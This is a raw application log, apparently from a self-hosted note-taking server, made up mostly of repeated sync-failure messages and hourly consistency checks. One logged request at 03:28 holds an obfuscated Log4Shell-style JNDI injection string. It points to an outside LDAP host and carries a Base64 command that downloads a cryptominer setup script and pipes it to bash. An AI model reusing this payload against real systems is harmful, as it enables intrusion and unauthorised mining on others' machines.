00:00:58.662 No connection to sync server.
00:01:58.666 No connection to sync server.
00:02:58.711 No connection to sync server.
00:03:58.704 No connection to sync server.
00:04:58.729 No connection to sync server.
00:05:58.734 No connection to sync server.
00:06:58.757 No connection to sync server.
00:07:58.757 No connection to sync server.
00:08:58.786 No connection to sync server.
00:09:58.801 No connection to sync server.
00:10:58.819 No connection to sync server.
00:11:58.834 No connection to sync server.
00:12:58.850 No connection to sync server.
00:13:58.857 No connection to sync server.
00:14:58.877 No connection to sync server.
00:15:58.890 No connection to sync server.
00:16:58.906 No connection to sync server.
00:17:07.718 Table counts: notes: 308, revisions: 122, attachments: 64, branches: 311, attributes: 457, etapi_tokens: 0, blobs: 333
00:17:07.747 All consistency checks passed with no errors detected (took 29ms)
00:17:58.915 No connection to sync server.
00:18:58.933 No connection to sync server.
00:19:58.944 No connection to sync server.
00:20:58.964 No connection to sync server.
00:21:58.972 No connection to sync server.
00:22:58.989 No connection to sync server.
00:23:59.004 No connection to sync server.
00:24:59.018 No connection to sync server.
00:25:59.026 No connection to sync server.
00:26:59.051 No connection to sync server.
00:27:59.059 No connection to sync server.
00:28:59.068 No connection to sync server.
00:29:59.099 No connection to sync server.
00:30:59.099 No connection to sync server.
00:31:59.123 No connection to sync server.
00:32:59.143 No connection to sync server.
00:33:59.147 No connection to sync server.
00:34:59.161 No connection to sync server.
00:35:59.182 No connection to sync server.
00:36:59.195 No connection to sync server.
00:37:59.209 No connection to sync server.
00:38:59.230 No connection to sync server.
00:39:59.225 No connection to sync server.
00:40:59.251 No connection to sync server.
00:41:59.267 No connection to sync server.
00:42:59.279 No connection to sync server.
00:43:59.286 No connection to sync server.
00:44:59.302 No connection to sync server.
00:45:59.304 No connection to sync server.
00:46:59.334 No connection to sync server.
00:47:59.340 No connection to sync server.
00:48:59.366 No connection to sync server.
00:49:59.363 No connection to sync server.
00:50:59.381 No connection to sync server.
00:51:59.401 No connection to sync server.
00:52:59.420 No connection to sync server.
00:53:59.441 No connection to sync server.
00:54:59.449 No connection to sync server.
00:55:59.451 No connection to sync server.
00:56:59.472 No connection to sync server.
00:57:59.477 No connection to sync server.
00:58:59.504 No connection to sync server.
00:59:59.504 No connection to sync server.
01:00:59.537 No connection to sync server.
01:01:59.528 No connection to sync server.
01:02:59.555 No connection to sync server.
01:03:59.561 No connection to sync server.
01:04:59.592 No connection to sync server.
01:05:59.594 No connection to sync server.
01:06:59.613 No connection to sync server.
01:07:59.701 No connection to sync server.
01:08:59.641 No connection to sync server.
01:09:59.655 No connection to sync server.
01:10:59.680 No connection to sync server.
01:11:59.676 No connection to sync server.
01:12:59.704 No connection to sync server.
01:13:59.706 No connection to sync server.
01:14:59.724 No connection to sync server.
01:15:59.738 No connection to sync server.
01:16:59.772 No connection to sync server.
01:17:07.722 Table counts: notes: 308, revisions: 122, attachments: 64, branches: 311, attributes: 457, etapi_tokens: 0, blobs: 333
01:17:07.750 All consistency checks passed with no errors detected (took 29ms)
01:17:59.764 No connection to sync server.
01:18:59.784 No connection to sync server.
01:19:59.794 No connection to sync server.
01:20:59.816 No connection to sync server.
01:21:59.816 No connection to sync server.
01:22:59.844 No connection to sync server.
01:23:59.862 No connection to sync server.
01:24:59.875 No connection to sync server.
01:25:59.884 No connection to sync server.
01:26:59.898 No connection to sync server.
01:27:59.921 No connection to sync server.
01:28:59.928 No connection to sync server.
01:29:59.945 No connection to sync server.
01:30:59.965 No connection to sync server.
01:31:59.978 No connection to sync server.
01:32:59.978 No connection to sync server.
01:34:00.004 No connection to sync server.
01:35:00.013 No connection to sync server.
01:36:00.025 No connection to sync server.
01:37:00.044 No connection to sync server.
01:38:00.156 No connection to sync server.
01:39:00.078 No connection to sync server.
01:40:00.078 No connection to sync server.
01:41:00.099 No connection to sync server.
01:42:00.125 No connection to sync server.
01:43:00.123 No connection to sync server.
01:44:00.220 No connection to sync server.
01:45:00.149 No connection to sync server.
01:46:00.168 No connection to sync server.
01:47:00.194 No connection to sync server.
01:48:00.238 No connection to sync server.
01:49:00.264 No connection to sync server.
01:50:00.229 No connection to sync server.
01:51:00.256 No connection to sync server.
01:52:00.260 No connection to sync server.
01:53:00.275 No connection to sync server.
01:54:00.284 No connection to sync server.
01:55:00.307 No connection to sync server.
01:56:00.324 No connection to sync server.
01:57:00.337 No connection to sync server.
01:58:00.342 No connection to sync server.
01:59:00.356 No connection to sync server.
02:00:00.370 No connection to sync server.
02:01:00.400 No connection to sync server.
02:02:00.402 No connection to sync server.
02:03:00.428 No connection to sync server.
02:04:00.424 No connection to sync server.
02:05:00.457 No connection to sync server.
02:06:00.466 No connection to sync server.
02:07:00.484 No connection to sync server.
02:08:00.485 No connection to sync server.
02:09:00.510 No connection to sync server.
02:10:00.513 No connection to sync server.
02:11:00.537 No connection to sync server.
02:12:00.543 No connection to sync server.
02:13:00.574 No connection to sync server.
02:14:00.572 No connection to sync server.
02:15:00.594 No connection to sync server.
02:16:00.595 No connection to sync server.
02:17:00.627 No connection to sync server.
02:17:07.723 Table counts: notes: 308, revisions: 122, attachments: 64, branches: 311, attributes: 457, etapi_tokens: 0, blobs: 333
02:17:07.752 All consistency checks passed with no errors detected (took 30ms)
02:18:00.651 No connection to sync server.
02:19:00.655 No connection to sync server.
02:20:00.656 No connection to sync server.
02:21:00.679 No connection to sync server.
02:22:00.681 No connection to sync server.
02:23:00.702 No connection to sync server.
02:24:00.706 No connection to sync server.
02:25:00.723 No connection to sync server.
02:26:00.739 No connection to sync server.
02:27:00.776 No connection to sync server.
02:28:00.768 No connection to sync server.
02:29:00.792 No connection to sync server.
02:30:00.792 No connection to sync server.
02:31:00.825 No connection to sync server.
02:32:00.842 No connection to sync server.
02:33:00.854 No connection to sync server.
02:34:00.847 No connection to sync server.
02:35:00.867 No connection to sync server.
02:36:00.887 No connection to sync server.
02:37:00.893 No connection to sync server.
02:38:00.913 No connection to sync server.
02:39:00.916 No connection to sync server.
02:40:00.930 No connection to sync server.
02:41:00.948 No connection to sync server.
02:42:00.965 No connection to sync server.
02:43:00.990 No connection to sync server.
02:44:00.996 No connection to sync server.
02:45:01.002 No connection to sync server.
02:46:01.013 No connection to sync server.
02:47:01.034 No connection to sync server.
02:48:01.611 No connection to sync server.
02:49:01.063 No connection to sync server.
02:50:01.087 No connection to sync server.
02:51:01.094 No connection to sync server.
02:52:01.103 No connection to sync server.
02:53:01.124 No connection to sync server.
02:54:01.123 No connection to sync server.
02:55:01.151 No connection to sync server.
02:56:01.172 No connection to sync server.
02:57:01.187 No connection to sync server.
02:58:01.182 No connection to sync server.
02:59:01.217 No connection to sync server.
03:00:01.214 No connection to sync server.
03:01:01.245 No connection to sync server.
03:02:01.264 No connection to sync server.
03:03:01.265 No connection to sync server.
03:04:01.266 No connection to sync server.
03:05:01.300 No connection to sync server.
03:06:01.298 No connection to sync server.
03:07:01.314 No connection to sync server.
03:08:01.336 No connection to sync server.
03:09:01.356 No connection to sync server.
03:10:01.367 No connection to sync server.
03:11:01.368 No connection to sync server.
03:12:01.390 No connection to sync server.
03:13:01.406 No connection to sync server.
03:14:01.410 No connection to sync server.
03:15:01.429 No connection to sync server.
03:16:01.437 No connection to sync server.
03:17:01.448 No connection to sync server.
03:17:07.725 Table counts: notes: 308, revisions: 122, attachments: 64, branches: 311, attributes: 457, etapi_tokens: 0, blobs: 333
03:17:07.754 All consistency checks passed with no errors detected (took 30ms)
03:18:01.469 No connection to sync server.
03:19:01.489 No connection to sync server.
03:20:01.489 No connection to sync server.
03:21:01.521 No connection to sync server.
03:22:01.528 No connection to sync server.
03:23:01.542 No connection to sync server.
03:24:01.543 No connection to sync server.
03:25:01.557 No connection to sync server.
03:26:01.576 No connection to sync server.
03:27:01.602 No connection to sync server.
03:28:01.601 No connection to sync server.
03:28:51.668 Error: Router not found for request GET /t%28%27$%7B$%7Benv:NaN:-j%7Dndi$%7Benv:NaN:-:%7D$%7Benv:NaN:-l%7Ddap$%7Benv:NaN:-:%7D//31.15.16.252:3306/TomcatBypass/Command/Base64/Y3VybCAtcyAtTCBodHRwczovL2Rvd25sb2FkLmMzcG9vbC5vcmcveG1yaWdfc2V0dXAvcmF3L21hc3Rlci9zZXR1cF9jM3Bvb2xfbWluZXIuc2ggfCBMQ19BTEw9ZW5fVVMuVVRGLTggYmFzaCAtcyA0ODZ4cXc3eXNYZEt3N1JrVnpUNXRkU2lEdEU2c294VWRZYUdhR0UxR29hQ2R2QkY3clZnNW9NWEw5cEZ4M3JCMVdVQ1pySnZkNkFITUZXaXBlWXQ1ZUZOVXg5cG1HTg==%7D%27%29
03:29:01.612 No connection to sync server.
03:30:01.637 No connection to sync server.
03:31:01.646 No connection to sync server.
03:32:01.656 No connection to sync server.
03:33:01.660 No connection to sync server.
03:34:01.677 No connection to sync server.
03:35:01.697 No connection to sync server.
03:36:01.706 No connection to sync server.
03:37:01.710 No connection to sync server.
03:38:01.728 No connection to sync server.
03:39:01.730 No connection to sync server.
03:40:01.746 No connection to sync server.
03:41:01.784 No connection to sync server.
03:42:01.777 No connection to sync server.
03:43:01.782 No connection to sync server.
03:44:01.798 No connection to sync server.
03:45:01.795 No connection to sync server.
03:46:01.826 No connection to sync server.
03:47:01.833 No connection to sync server.
03:48:01.860 No connection to sync server.
03:49:01.863 No connection to sync server.
03:50:01.875 No connection to sync server.
03:51:01.879 No connection to sync server.
03:52:01.910 No connection to sync server.
03:53:01.906 No connection to sync server.
03:54:01.938 No connection to sync server.
03:55:01.925 No connection to sync server.
03:56:01.962 No connection to sync server.
03:57:02.023 No connection to sync server.
03:58:01.991 No connection to sync server.
03:59:02.009 No connection to sync server.
04:00:02.039 No connection to sync server.
04:01:02.033 No connection to sync server.
04:02:02.052 No connection to sync server.
04:03:02.044 No connection to sync server.
04:04:02.073 No connection to sync server.
04:05:02.105 No connection to sync server.
04:06:02.112 No connection to sync server.
04:07:02.102 No connection to sync server.
04:08:02.127 No connection to sync server.
04:09:02.133 No connection to sync server.
04:10:02.152 No connection to sync server.
04:11:02.165 No connection to sync server.
04:12:02.179 No connection to sync server.
04:13:02.201 No connection to sync server.
04:14:02.208 No connection to sync server.
04:15:02.227 No connection to sync server.
04:16:02.228 No connection to sync server.
04:17:02.275 No connection to sync server.
04:17:07.730 Table counts: notes: 308, revisions: 122, attachments: 64, branches: 311, attributes: 457, etapi_tokens: 0, blobs: 333
04:17:07.750 All consistency checks passed with no errors detected (took 21ms)
04:18:02.281 No connection to sync server.
04:19:02.278 No connection to sync server.
04:20:02.309 No connection to sync server.
04:21:02.305 No connection to sync server.
04:22:02.323 No connection to sync server.
04:23:02.330 No connection to sync server.
04:24:02.341 No connection to sync server.
04:25:02.355 No connection to sync server.
04:26:02.374 No connection to sync server.
04:27:02.380 No connection to sync server.
04:28:02.396 No connection to sync server.
04:29:02.411 No connection to sync server.
04:30:02.420 No connection to sync server.
04:31:02.436 No connection to sync server.
04:32:02.450 No connection to sync server.
04:33:02.468 No connection to sync server.
04:34:02.482 No connection to sync server.
04:35:02.492 No connection to sync server.
04:36:02.512 No connection to sync server.
04:37:02.523 No connection to sync server.
04:38:02.537 No connection to sync server.
04:39:02.547 No connection to sync server.
04:40:02.552 No connection to sync server.
04:41:02.559 No connection to sync server.
04:42:02.583 No connection to sync server.
04:43:02.592 No connection to sync server.
04:44:02.601 No connection to sync server.
04:45:02.663 No connection to sync server.
04:46:02.661 No connection to sync server.
04:47:02.654 No connection to sync server.
04:48:02.678 No connection to sync server.
04:49:02.663 No connection to sync server.
04:50:02.708 No connection to sync server.
04:51:02.688 No connection to sync server.
04:52:02.731 No connection to sync server.
04:53:02.722 No connection to sync server.
04:54:02.751 No connection to sync server.
04:55:02.788 No connection to sync server.
04:56:02.762 No connection to sync server.
04:57:02.783 No connection to sync server.
04:58:02.798 No connection to sync server.
04:59:02.801 No connection to sync server.
05:00:02.822 No connection to sync server.
05:01:02.855 No connection to sync server.
05:02:02.837 No connection to sync server.
05:03:02.858 No connection to sync server.
05:04:02.860 No connection to sync server.
05:05:02.887 No connection to sync server.
05:06:02.889 No connection to sync server.
05:07:02.947 No connection to sync server.
05:08:02.914 No connection to sync server.
05:09:02.931 No connection to sync server.
05:10:02.952 No connection to sync server.
05:11:02.956 No connection to sync server.
05:12:02.953 No connection to sync server.
05:13:02.978 No connection to sync server.
05:14:02.990 No connection to sync server.
05:15:03.009 No connection to sync server.
05:16:03.016 No connection to sync server.
05:17:03.025 No connection to sync server.
05:17:07.734 Table counts: notes: 308, revisions: 122, attachments: 64, branches: 311, attributes: 457, etapi_tokens: 0, blobs: 333
05:17:07.760 All consistency checks passed with no errors detected (took 27ms)
05:18:03.043 No connection to sync server.
05:19:03.057 No connection to sync server.
05:20:03.083 No connection to sync server.
05:21:03.102 No connection to sync server.
05:22:03.088 No connection to sync server.
05:23:03.098 No connection to sync server.
05:24:03.125 No connection to sync server.
05:25:03.157 No connection to sync server.
05:26:03.139 No connection to sync server.
05:27:03.194 No connection to sync server.
05:28:03.188 No connection to sync server.
05:29:03.193 No connection to sync server.
05:30:03.196 No connection to sync server.
05:31:03.205 No connection to sync server.
05:32:03.221 No connection to sync server.
05:33:03.227 No connection to sync server.
05:34:03.233 No connection to sync server.
05:35:03.263 No connection to sync server.
05:36:03.284 No connection to sync server.
05:37:03.274 No connection to sync server.
05:38:03.294 No connection to sync server.
05:39:03.322 No connection to sync server.
05:40:03.316 No connection to sync server.
05:41:03.329 No connection to sync server.
05:42:03.332 No connection to sync server.
05:43:03.350 No connection to sync server.
05:44:03.375 No connection to sync server.
05:45:03.385 No connection to sync server.
05:46:03.384 No connection to sync server.
05:47:03.392 No connection to sync server.
05:48:03.406 No connection to sync server.
05:49:03.416 No connection to sync server.
05:50:03.427 No connection to sync server.
05:51:03.441 No connection to sync server.
05:52:03.456 No connection to sync server.
05:53:03.458 No connection to sync server.
05:54:03.487 No connection to sync server.
05:55:03.483 No connection to sync server.
05:56:03.495 No connection to sync server.
05:57:03.501 No connection to sync server.
05:58:03.533 No connection to sync server.
05:59:03.558 No connection to sync server.
06:00:03.554 No connection to sync server.
06:01:03.563 No connection to sync server.
06:02:03.577 No connection to sync server.
06:03:03.590 No connection to sync server.
06:04:03.590 No connection to sync server.
06:05:03.611 No connection to sync server.
06:06:03.619 No connection to sync server.
06:07:03.656 No connection to sync server.
06:08:03.667 No connection to sync server.
06:09:03.653 No connection to sync server.
06:10:03.674 No connection to sync server.
06:11:03.675 No connection to sync server.
06:12:03.710 No connection to sync server.
06:13:03.717 No connection to sync server.
06:14:03.729 No connection to sync server.
06:15:03.743 No connection to sync server.
06:16:03.751 No connection to sync server.
06:17:03.752 No connection to sync server.
06:17:06.804 Optimizing database
06:17:06.805 Optimization finished in 1ms.
06:17:07.735 Table counts: notes: 308, revisions: 122, attachments: 64, branches: 311, attributes: 457, etapi_tokens: 0, blobs: 333
06:17:07.762 All consistency checks passed with no errors detected (took 28ms)
06:18:03.765 No connection to sync server.
06:19:03.787 No connection to sync server.
06:20:03.799 No connection to sync server.
06:21:03.801 No connection to sync server.
06:22:03.834 No connection to sync server.
06:23:03.823 No connection to sync server.
06:24:03.842 No connection to sync server.
06:25:03.890 No connection to sync server.
06:26:03.866 No connection to sync server.
06:27:03.901 No connection to sync server.
06:28:03.892 No connection to sync server.
06:29:03.929 No connection to sync server.
06:30:03.934 No connection to sync server.
06:31:03.960 No connection to sync server.
06:32:03.950 No connection to sync server.
06:33:03.960 No connection to sync server.
06:34:03.968 No connection to sync server.
06:35:03.998 No connection to sync server.
06:36:03.997 No connection to sync server.
06:37:04.023 No connection to sync server.
06:38:04.029 No connection to sync server.
06:39:04.041 No connection to sync server.
06:40:04.045 No connection to sync server.
06:41:04.059 No connection to sync server.
06:42:04.072 No connection to sync server.
06:43:04.099 No connection to sync server.
06:44:04.095 No connection to sync server.
06:45:04.146 No connection to sync server.
06:46:04.124 No connection to sync server.
06:47:04.137 No connection to sync server.
06:48:04.134 No connection to sync server.
06:49:04.156 No connection to sync server.
06:50:04.173 No connection to sync server.
06:51:04.213 No connection to sync server.
06:52:04.223 No connection to sync server.
06:53:04.205 No connection to sync server.
06:54:04.234 No connection to sync server.
06:55:04.237 No connection to sync server.
06:56:04.259 No connection to sync server.
06:57:04.241 No connection to sync server.
06:58:04.262 No connection to sync server.
06:59:04.272 No connection to sync server.
07:00:04.287 No connection to sync server.
07:01:04.323 No connection to sync server.
07:02:04.303 No connection to sync server.
07:03:04.327 No connection to sync server.
07:04:04.348 No connection to sync server.
07:05:04.350 No connection to sync server.
07:06:04.378 No connection to sync server.
07:07:04.386 No connection to sync server.
07:08:04.399 No connection to sync server.
07:09:04.397 No connection to sync server.
07:10:04.414 No connection to sync server.
07:11:04.424 No connection to sync server.
07:12:04.436 No connection to sync server.
07:13:04.459 No connection to sync server.
07:14:04.449 No connection to sync server.
07:15:04.487 No connection to sync server.
07:16:04.481 No connection to sync server.
07:17:04.502 No connection to sync server.
07:17:07.742 Table counts: notes: 308, revisions: 122, attachments: 64, branches: 311, attributes: 457, etapi_tokens: 0, blobs: 333
07:17:07.816 All consistency checks passed with no errors detected (took 75ms)
07:18:04.512 No connection to sync server.
07:19:04.526 No connection to sync server.
07:20:04.532 No connection to sync server.
07:21:04.541 No connection to sync server.
07:22:04.559 No connection to sync server.
07:23:04.572 No connection to sync server.
07:24:04.570 No connection to sync server.
07:25:04.602 No connection to sync server.
07:26:04.598 No connection to sync server.
07:27:04.607 No connection to sync server.
07:28:04.614 No connection to sync server.
07:29:04.642 No connection to sync server.
07:30:04.718 No connection to sync server.
07:31:04.669 No connection to sync server.
07:32:04.666 No connection to sync server.
07:33:04.677 No connection to sync server.
07:34:04.696 No connection to sync server.
07:35:04.695 No connection to sync server.
07:36:04.711 No connection to sync server.
07:37:04.716 No connection to sync server.
07:38:04.730 No connection to sync server.
07:39:04.737 No connection to sync server.
07:40:04.749 No connection to sync server.
07:41:04.757 No connection to sync server.
07:42:04.776 No connection to sync server.
07:43:04.783 No connection to sync server.
07:44:04.800 No connection to sync server.
07:45:04.801 No connection to sync server.
07:46:04.825 No connection to sync server.
07:47:04.825 No connection to sync server.
07:48:04.978 No connection to sync server.
07:49:04.849 No connection to sync server.
07:50:04.848 No connection to sync server.
07:51:04.864 No connection to sync server.
07:52:04.877 No connection to sync server.
07:53:04.894 No connection to sync server.
07:54:04.895 No connection to sync server.
07:55:04.916 No connection to sync server.
07:56:04.953 No connection to sync server.
07:57:04.945 No connection to sync server.
07:58:04.934 No connection to sync server.
07:59:04.946 No connection to sync server.
08:00:04.956 No connection to sync server.
08:01:04.982 No connection to sync server.
08:02:04.994 No connection to sync server.
08:03:04.999 No connection to sync server.
08:04:05.006 No connection to sync server.
08:05:05.019 No connection to sync server.
08:06:05.048 No connection to sync server.
08:07:05.037 No connection to sync server.
08:08:05.038 No connection to sync server.
08:09:05.054 No connection to sync server.
08:10:05.056 No connection to sync server.
08:11:05.086 No connection to sync server.
08:12:05.088 No connection to sync server.
08:13:05.102 No connection to sync server.
08:14:05.108 No connection to sync server.
08:15:05.130 No connection to sync server.
08:16:05.135 No connection to sync server.
08:17:05.133 No connection to sync server.
08:17:07.745 Table counts: notes: 308, revisions: 122, attachments: 64, branches: 311, attributes: 457, etapi_tokens: 0, blobs: 333
08:17:07.771 All consistency checks passed with no errors detected (took 26ms)
08:18:05.153 No connection to sync server.
08:19:05.144 No connection to sync server.
08:20:05.173 No connection to sync server.
08:21:05.175 No connection to sync server.
08:22:05.201 No connection to sync server.
08:23:05.219 No connection to sync server.
08:24:05.226 No connection to sync server.
08:25:05.216 No connection to sync server.
08:26:05.236 No connection to sync server.
08:27:05.239 No connection to sync server.
08:28:05.249 No connection to sync server.
08:29:05.257 No connection to sync server.
08:30:05.349 No connection to sync server.
08:31:05.277 No connection to sync server.
08:32:05.293 No connection to sync server.
08:33:05.302 No connection to sync server.
08:34:05.341 No connection to sync server.
08:35:05.325 No connection to sync server.
08:36:05.348 No connection to sync server.
08:37:05.341 No connection to sync server.
08:38:05.358 No connection to sync server.
08:39:05.362 No connection to sync server.
08:40:05.374 No connection to sync server.
08:41:05.369 No connection to sync server.
08:42:05.388 No connection to sync server.
08:43:05.400 No connection to sync server.
08:44:05.409 No connection to sync server.
08:45:05.433 No connection to sync server.
08:46:05.437 No connection to sync server.
08:47:05.438 No connection to sync server.
08:48:05.455 No connection to sync server.
08:49:05.457 No connection to sync server.
08:50:05.467 No connection to sync server.
08:51:05.474 No connection to sync server.
08:52:05.494 No connection to sync server.
08:53:05.496 No connection to sync server.
08:54:05.510 No connection to sync server.
08:55:05.520 No connection to sync server.
08:56:05.533 No connection to sync server.
08:57:05.535 No connection to sync server.
08:58:05.550 No connection to sync server.
08:59:05.621 No connection to sync server.
09:00:05.598 No connection to sync server.
09:01:05.591 No connection to sync server.
09:02:05.596 No connection to sync server.
09:03:05.614 No connection to sync server.
09:04:05.622 No connection to sync server.
09:05:05.648 No connection to sync server.
09:06:05.636 No connection to sync server.
09:07:05.661 No connection to sync server.
09:08:05.648 No connection to sync server.
09:09:05.666 No connection to sync server.
09:10:05.668 No connection to sync server.
09:11:05.684 No connection to sync server.
09:12:05.726 No connection to sync server.
09:13:05.718 No connection to sync server.
09:14:05.714 No connection to sync server.
09:15:05.748 No connection to sync server.
09:16:05.737 No connection to sync server.
09:17:05.755 No connection to sync server.
09:17:07.745 Table counts: notes: 308, revisions: 122, attachments: 64, branches: 311, attributes: 457, etapi_tokens: 0, blobs: 333
09:17:07.765 All consistency checks passed with no errors detected (took 20ms)
09:18:05.745 No connection to sync server.
09:19:05.764 No connection to sync server.
09:20:05.773 No connection to sync server.
09:21:05.804 No connection to sync server.
09:22:05.782 No connection to sync server.
09:23:05.799 No connection to sync server.
09:24:05.800 No connection to sync server.
09:25:05.808 No connection to sync server.
09:26:05.821 No connection to sync server.
09:27:05.830 No connection to sync server.
09:28:05.832 No connection to sync server.
09:29:05.852 No connection to sync server.
09:30:05.862 No connection to sync server.
09:31:05.880 No connection to sync server.
09:32:05.891 No connection to sync server.
09:33:05.894 No connection to sync server.
09:34:05.899 No connection to sync server.
09:35:05.925 No connection to sync server.
09:36:05.924 No connection to sync server.
09:37:05.926 No connection to sync server.
09:38:05.939 No connection to sync server.
09:39:05.961 No connection to sync server.
09:40:05.961 No connection to sync server.
09:41:05.975 No connection to sync server.
09:42:06.025 No connection to sync server.
09:43:05.979 No connection to sync server.
09:44:05.993 No connection to sync server.
09:45:06.019 No connection to sync server.
09:46:06.020 No connection to sync server.
09:47:06.034 No connection to sync server.
09:48:06.036 No connection to sync server.
09:49:06.038 No connection to sync server.
09:50:06.044 No connection to sync server.
09:51:06.050 No connection to sync server.
09:52:06.064 No connection to sync server.
09:53:06.069 No connection to sync server.
09:54:06.079 No connection to sync server.
09:55:06.090 No connection to sync server.
09:56:06.103 No connection to sync server.
09:57:06.105 No connection to sync server.
09:58:06.138 No connection to sync server.
09:59:06.127 No connection to sync server.
10:00:06.174 No connection to sync server.
10:01:06.149 No connection to sync server.
10:02:06.152 No connection to sync server.
10:03:06.159 No connection to sync server.
10:04:06.164 No connection to sync server.
10:05:06.179 No connection to sync server.
10:06:06.187 No connection to sync server.
10:07:06.192 No connection to sync server.
10:08:06.199 No connection to sync server.
10:09:06.223 No connection to sync server.
10:10:06.213 No connection to sync server.
10:11:06.237 No connection to sync server.
10:12:06.239 No connection to sync server.
10:13:06.246 No connection to sync server.
10:14:06.254 No connection to sync server.
10:15:06.263 No connection to sync server.
10:16:06.269 No connection to sync server.
10:17:06.292 No connection to sync server.
10:17:07.746 Table counts: notes: 308, revisions: 122, attachments: 64, branches: 311, attributes: 457, etapi_tokens: 0, blobs: 333
10:17:07.775 All consistency checks passed with no errors detected (took 29ms)
10:18:06.286 No connection to sync server.
10:19:06.314 No connection to sync server.
10:20:06.298 No connection to sync server.
10:21:06.307 No connection to sync server.
10:22:06.329 No connection to sync server.
10:23:06.336 No connection to sync server.
10:24:06.329 No connection to sync server.
10:25:06.351 No connection to sync server.
10:26:06.353 No connection to sync server.
10:27:06.366 No connection to sync server.
10:28:06.375 No connection to sync server.
10:29:06.380 No connection to sync server.
10:30:06.393 No connection to sync server.
10:31:06.401 No connection to sync server.
10:32:06.391 No connection to sync server.
10:33:06.427 No connection to sync server.
10:34:06.424 No connection to sync server.
10:35:06.454 No connection to sync server.
10:36:06.440 No connection to sync server.
10:37:06.447 No connection to sync server.
10:38:06.450 No connection to sync server.
10:39:06.460 No connection to sync server.
10:40:06.476 No connection to sync server.
10:41:06.476 No connection to sync server.
10:42:06.530 No connection to sync server.
10:43:06.500 No connection to sync server.
10:44:06.528 No connection to sync server.
10:45:06.507 No connection to sync server.
10:46:06.524 No connection to sync server.
10:47:06.526 No connection to sync server.
10:48:06.546 No connection to sync server.
10:49:06.538 No connection to sync server.
10:50:06.550 No connection to sync server.
10:51:06.548 No connection to sync server.
10:52:06.566 No connection to sync server.
10:53:06.577 No connection to sync server.
10:54:06.584 No connection to sync server.
10:55:06.585 No connection to sync server.
10:56:06.599 No connection to sync server.
10:57:06.607 No connection to sync server.
10:58:06.620 No connection to sync server.
10:59:06.619 No connection to sync server.
11:00:06.635 No connection to sync server.
11:01:06.633 No connection to sync server.
11:01:47.725 Error: Router not found for request GET /sitemap.xml
11:02:06.631 No connection to sync server.
11:03:06.640 No connection to sync server.
11:03:37.006 Error: Router not found for request GET /.well-known/security.txt
11:04:06.657 No connection to sync server.
11:05:06.668 No connection to sync server.
11:06:06.679 No connection to sync server.
11:07:06.681 No connection to sync server.
11:08:06.677 No connection to sync server.
11:09:06.702 No connection to sync server.
11:10:06.704 No connection to sync server.
11:11:06.695 No connection to sync server.
11:12:06.723 No connection to sync server.
11:13:06.710 No connection to sync server.
11:14:06.731 No connection to sync server.
11:15:06.732 No connection to sync server.
11:16:06.746 No connection to sync server.
11:17:06.747 No connection to sync server.
11:17:07.747 Table counts: notes: 308, revisions: 122, attachments: 64, branches: 311, attributes: 457, etapi_tokens: 0, blobs: 333
11:17:07.771 All consistency checks passed with no errors detected (took 24ms)
11:18:06.763 No connection to sync server.
11:19:06.757 No connection to sync server.
11:20:06.761 No connection to sync server.
11:21:06.770 No connection to sync server.
11:22:06.779 No connection to sync server.
11:23:06.785 No connection to sync server.
11:24:06.800 No connection to sync server.
11:25:06.796 No connection to sync server.
11:26:06.810 No connection to sync server.
11:27:06.816 No connection to sync server.
11:28:06.826 No connection to sync server.
11:29:06.839 No connection to sync server.
11:30:06.850 No connection to sync server.
11:31:06.852 No connection to sync server.
11:32:06.855 No connection to sync server.
11:33:06.869 No connection to sync server.
11:34:06.871 No connection to sync server.
11:35:06.869 No connection to sync server.
11:36:06.882 No connection to sync server.
11:37:06.888 No connection to sync server.
11:38:06.902 No connection to sync server.
11:39:06.903 No connection to sync server.
11:40:06.902 No connection to sync server.
11:41:06.913 No connection to sync server.
11:42:06.928 No connection to sync server.
11:43:06.927 No connection to sync server.
11:44:06.937 No connection to sync server.
11:45:06.957 No connection to sync server.
11:46:06.947 No connection to sync server.
11:47:06.961 No connection to sync server.
11:48:06.959 No connection to sync server.
11:49:06.982 No connection to sync server.
11:50:06.966 No connection to sync server.
11:51:06.990 No connection to sync server.
11:52:06.993 No connection to sync server.
11:53:07.001 No connection to sync server.
11:54:07.001 No connection to sync server.
11:55:07.035 No connection to sync server.
11:56:07.012 No connection to sync server.
11:57:07.023 No connection to sync server.
11:58:07.033 No connection to sync server.
11:59:07.022 No connection to sync server.
12:00:07.039 No connection to sync server.
12:01:07.061 No connection to sync server.
12:02:07.061 No connection to sync server.
12:03:07.070 No connection to sync server.
12:04:07.074 No connection to sync server.
12:05:07.114 No connection to sync server.
12:06:07.068 No connection to sync server.
12:07:07.079 No connection to sync server.
12:08:07.089 No connection to sync server.
12:09:07.093 No connection to sync server.
12:10:07.103 No connection to sync server.
12:11:07.110 No connection to sync server.
12:12:07.122 No connection to sync server.
12:13:07.116 No connection to sync server.
12:14:08.144 No connection to sync server.
12:15:07.130 No connection to sync server.
12:16:07.138 No connection to sync server.
12:17:07.143 No connection to sync server.
12:17:07.748 Table counts: notes: 308, revisions: 122, attachments: 64, branches: 311, attributes: 457, etapi_tokens: 0, blobs: 333
12:17:07.784 All consistency checks passed with no errors detected (took 37ms)
12:18:07.153 No connection to sync server.
12:19:07.158 No connection to sync server.
12:20:07.167 No connection to sync server.
12:21:07.174 No connection to sync server.
12:22:07.170 No connection to sync server.
12:23:07.183 No connection to sync server.
12:24:07.215 No connection to sync server.
12:25:07.206 No connection to sync server.
12:26:07.215 No connection to sync server.
12:27:07.196 No connection to sync server.
12:28:07.208 No connection to sync server.
12:29:07.214 No connection to sync server.
12:30:07.220 No connection to sync server.
12:31:07.217 No connection to sync server.
12:32:07.236 No connection to sync server.
12:33:07.257 No connection to sync server.
12:34:07.246 No connection to sync server.
12:35:07.259 No connection to sync server.
12:36:07.256 No connection to sync server.
12:37:07.260 No connection to sync server.
12:38:07.273 No connection to sync server.
12:39:07.282 No connection to sync server.
12:40:07.276 No connection to sync server.
12:41:07.327 No connection to sync server.
12:42:07.288 No connection to sync server.
12:43:07.314 No connection to sync server.
12:44:07.306 No connection to sync server.
12:45:08.335 No connection to sync server.
12:46:07.332 No connection to sync server.
12:47:07.359 No connection to sync server.
12:48:07.355 No connection to sync server.
12:49:07.337 No connection to sync server.
12:50:07.527 No connection to sync server.
12:51:07.352 No connection to sync server.
12:52:07.362 No connection to sync server.
12:53:07.359 No connection to sync server.
12:54:07.383 No connection to sync server.
12:55:07.380 No connection to sync server.
12:56:07.390 No connection to sync server.
12:57:07.388 No connection to sync server.
12:58:07.390 No connection to sync server.
12:59:07.401 No connection to sync server.
13:00:07.409 No connection to sync server.
